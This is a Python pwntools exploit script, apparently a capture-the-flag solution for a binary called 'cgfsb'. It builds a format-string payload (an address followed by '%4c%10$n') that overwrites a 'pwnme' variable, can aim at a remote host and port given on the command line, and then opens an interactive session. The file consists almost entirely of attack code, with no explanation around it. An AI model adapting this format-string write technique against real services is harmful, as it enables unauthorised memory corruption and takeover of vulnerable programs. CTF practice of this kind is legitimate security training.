#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
arch_64 = 1
exe = "./cgfsb"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
libc = e.libc
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
#    libc = ELF("./libc.so.6")
else:
    p = process([exe])

if arch_64:
#    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    arena = 0x3c4b20
    context.arch = "amd64"
else:
#    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    arena = 0x1b2780
    context.arch = "i386"

def csu(offset,end,front,fun_got,arg1,arg2,arg3):
    tmp = flat(["A"*offset,end,0,1,fun_got,arg3,arg2,arg1,front,"A"*0x38,vul])
    return tmp

def z():
    gdb.attach(p)

def execfmt(payload):
    p = process([exe])
    ru(":\n")
    sl("AAAA")
    ru(":\n")
    sl(payload)
    return p.recvall()

#aufmt = FmtStr(execfmt)
#print aufmt.offset
off=10
pwnme = 0x804A068
p1 = p32(pwnme)+"%4c%10$n"

ru(":\n")
sl("AAAA")
ru(":\n")
sl(p1)

p.interactive()


